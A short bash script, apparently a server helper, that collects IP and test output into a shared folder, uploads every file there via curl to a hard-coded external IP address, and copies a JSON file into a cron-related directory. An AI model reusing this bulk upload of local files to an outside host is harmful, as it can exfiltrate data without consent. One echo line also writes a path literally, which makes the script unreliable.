#!/bin/bash
cd /var/_localApp
echo $mainIP >> /var/_shareFolder/mainIP.txt
echo /var/_localAppData/_ip >> /var/_shareFolder/_ip.txt
node test.js >> /var/_shareFolder/easy_ondemand.txt
# upload all file within /var/_shareFolder
curl -F "objPath=/var/_localAppData/sitesShareFolder/_shareMain" $(find /var/_shareFolder/ -name '*' -type f -exec echo -n -F "file=@{} " \;) 142.93.73.66:10000/upload > /var/_shareFolder/SB.txt
cp /var/shellScript/removeMe.json /var/_localAppData/commCron/
